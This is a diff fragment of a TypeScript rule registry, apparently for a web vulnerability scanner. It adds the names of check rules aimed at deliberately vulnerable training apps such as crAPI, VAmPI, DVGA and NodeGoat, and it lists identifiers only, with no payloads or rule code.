+  crapi2AuthLoginRouteLiveOracle,
+  crapi2ShopOrdersAllRouteLiveOracle,
+  crapi2ShopOrdersIdBolaRouteLiveOracle,
+  crapiShopOrdersIdBolaRouteLiveOracle,
+  finbotCtfChallengesRouteLiveOracle,
+  finbotCtfSidecarRouteLiveOracle,
+  finbotVendorSidecarRouteLiveOracle,
+  finbotAdminCopilotRouteLiveOracle,
   exposedApiConfig,
   sqliQueryParamInjection,
   sqliHeaderErrorDisclosure,
@@ -36380,6 +44746,97 @@ export const RULES: Record<string, Rule> = {
   xxeXmlPostProbe,
   clientSideCssInjectionEvidence,
   clientSideVapiEvidence,
+  vapiApi1BolaLiveOracle,
+  vapiApi1RouteLiveOracle,
+  vapiApi2BrokenAuthLiveOracle,
+  vapiApi2RouteLiveOracle,
+  vapiApi3CommentBolaLiveOracle,
+  vapiApi3CommentRouteLiveOracle,
+  vapiApi4OtpBrokenAuthLiveOracle,
+  vapiApi4OtpRouteLiveOracle,
+  vapiApi4UserExposureLiveOracle,
+  vapiApi5BflaLiveOracle,
+  vapiApi5RouteLiveOracle,
+  vapiApi6MassAssignmentLiveOracle,
+  vapiApi6RouteLiveOracle,
+  vapiApi8SqliLoginLiveOracle,
+  vapiApi8SecretRouteLiveOracle,
+  vapiApi7CorsMisconfigLiveOracle,
+  vapiApi7CorsRouteLiveOracle,
+  vapiApi9ImproperInventoryLiveOracle,
+  vapiApi9RouteLiveOracle,
+  vapiApi10LoggingLiveOracle,
+  vapiApi10RouteLiveOracle,
+  vapiJwtWeakTokenLiveOracle,
+  vapiJwtRouteLiveOracle,
+  vapiServerSurferLiveOracle,
+  vapiServerSurferRouteLiveOracle,
+  vapiStickyNotesStoredXssLiveOracle,
+  vapiStickyNotesRouteLiveOracle,
+  vapiRouteLiveOracle,
+  duckStoreUsersBolaLiveOracle,
+  duckStoreUsersRouteLiveOracle,
+  duckStoreTestimonialsBolaLiveOracle,
+  duckStoreTestimonialsRouteLiveOracle,
+  duckStoreOrdersBolaLiveOracle,
+  duckStoreOrdersRouteLiveOracle,
+  duckStoreCouponsDisclosureLiveOracle,
+  duckStoreCouponsRouteLiveOracle,
+  duckStoreSsrfFetchUrlLiveOracle,
+  duckStoreSsrfFetchUrlRouteLiveOracle,
+  duckStoreMcpCouponsDisclosureLiveOracle,
+  duckStoreMcpCouponsRouteLiveOracle,
+  duckStoreProductsFilterSqliLiveOracle,
+  duckStoreProductsFilterSqliRouteLiveOracle,
+  duckStoreCartNegativeQuantityLiveOracle,
+  duckStoreCartNegativeQuantityRouteLiveOracle,
+  duckStoreAdminUsersBflaLiveOracle,
+  duckStoreAdminUsersBflaRouteLiveOracle,
+  duckStoreCheckoutPrivateCouponLiveOracle,
+  duckStoreCheckoutPrivateCouponRouteLiveOracle,
+  duckStoreProfileMassAssignmentLiveOracle,
+  duckStoreProfileMassAssignmentRouteLiveOracle,
+  duckStoreTestimonialsStoredXssLiveOracle,
+  duckStoreTestimonialsStoredXssRouteLiveOracle,
+  duckStoreAuthLoginWeakCredentialsLiveOracle,
+  duckStoreAuthLoginWeakCredentialsRouteLiveOracle,
+  duckStoreOpenRedirectLiveOracle,
+  duckStoreOpenRedirectRouteLiveOracle,
+  duckStoreReferralCodeAbuseLiveOracle,
+  duckStoreReferralCodeAbuseRouteLiveOracle,
+  duckStoreAdminProductsNegativePriceLiveOracle,
+  duckStoreAdminProductsNegativePriceRouteLiveOracle,
+  duckStoreTestimonialsPutBolaLiveOracle,
+  duckStoreTestimonialsPutBolaRouteLiveOracle,
+  duckStoreAuthTotpBypassLiveOracle,
+  duckStoreAuthTotpBypassRouteLiveOracle,
+  dvgaRouteLiveOracle,
+  dvgaGraphqlAuditLogLiveOracle,
+  dvgaGraphqlAuditRouteLiveOracle,
+  dvgaGraphqlBatchingLiveOracle,
+  dvgaGraphqlBatchingRouteLiveOracle,
+  ginAndJuiceCatalogSearchXssLiveOracle,
+  ginAndJuiceCatalogRouteLiveOracle,
+  ginAndJuiceBlogPostOpenRedirectLiveOracle,
+  ginAndJuiceBlogPostRouteLiveOracle,
+  ginAndJuiceCatalogCategorySqliLiveOracle,
+  ginAndJuiceCatalogCategorySqliRouteLiveOracle,
+  istEduSearchXssRouteLiveOracle,
+  istEduNoticesLfiRouteLiveOracle,
+  istEduPortalSqliRouteLiveOracle,
+  istEduDashboardIdorRouteLiveOracle,
+  dvwuDashboardIdorRouteLiveOracle,
+  istEduNewsletterCrlfRouteLiveOracle,
+  dvwuPortalSqliRouteLiveOracle,
+  dvwuSearchXssRouteLiveOracle,
+  dvwuNoticesLfiRouteLiveOracle,
+  dvwuCsrfNewsletterCrlfRouteLiveOracle,
+  allSeeingEyeReadRouteLiveOracle,
+  allSeeingEyeHelloRouteLiveOracle,
+  istEduSsrfRedirectRouteLiveOracle,
+  dvwuSsrfRedirectRouteLiveOracle,
+  vulnExposeXssPlaygroundRouteLiveOracle,
+  vaultappLabGuideRouteLiveOracle,
   clientSideArchonTrainingEvidence,
   clientSideArchonApiSecurityCurriculumEvidence,
   clientSideOverthewireBanditEvidence,
@@ -36389,6 +44846,10 @@ export const RULES: Record<string, Rule> = {
   clientSideMcpSherpaWorkshopEvidence,
   htmlCommentCredentialDisclosure,
   openApiDebugPasswordExposure,
+  vampiUserBolaLiveOracle,
+  vampiUserBolaRouteLiveOracle,
+  vampiBooksExcessiveDataLiveOracle,
+  vampiBooksRouteLiveOracle,
   http403BypassProbe,
   clientSideDevsecopsPipelineVisualizerEvidence,
   clientSideQamaxAdversaryEvidence,
@@ -36423,6 +44884,8 @@ export const RULES: Record<string, Rule> = {
   clientSideOopssecStoreEvidence,
   clientSideOopssecRaceConditionEvidence,
   clientSideOopssecXffSqliEvidence,
+  oopssecXffSqliRouteLiveOracle,
+  oopssecLiveStreamBflaRouteLiveOracle,
   clientSideVoidsecShoppingCartEvidence,
   clientSidePortswiggerAcademyEvidence,
   clientSideHackinghubEvidence,
@@ -36433,6 +44896,27 @@ export const RULES: Record<string, Rule> = {
   clientSideGoogleXssGameEvidence,
   clientSideSentinelAiEvidence,
   clientSideNodegoatEvidence,
+  nodegoatTutorialA2RouteLiveOracle,
+  nodegoatTutorialA3RouteLiveOracle,
+  nodegoatTutorialA1RouteLiveOracle,
+  nodegoatTutorialA4RouteLiveOracle,
+  nodegoatTutorialA5RouteLiveOracle,
+  nodegoatTutorialA6RouteLiveOracle,
+  nodegoatTutorialA7RouteLiveOracle,
+  nodegoatTutorialA8RouteLiveOracle,
+  nodegoatTutorialA9RouteLiveOracle,
+  nodegoatTutorialA10RouteLiveOracle,
+  nodegoatLearnOpenRedirectLiveOracle,
+  nodegoatLearnOpenRedirectRouteLiveOracle,
+  nodegoatBenefitsNosqlRouteLiveOracle,
+  nodegoatSignupOpenRegistrationLiveOracle,
+  nodegoatSignupRouteLiveOracle,
+  vulnforgeAcademyLevelSqliRouteLiveOracle,
+  vulnforgeAcademyLevelXssRouteLiveOracle,
+  vulnbankUploadProfilePictureUrlRouteLiveOracle,
+  agentpwnAttackRouteLiveOracle,
+  agentpwnMcpExploitationRouteLiveOracle,
+  agentpwnContextWindowRouteLiveOracle,
   clientSideGandalfEvidence,
   clientSideIronwaspEvidence,
   clientSideTry2hackEvidence,
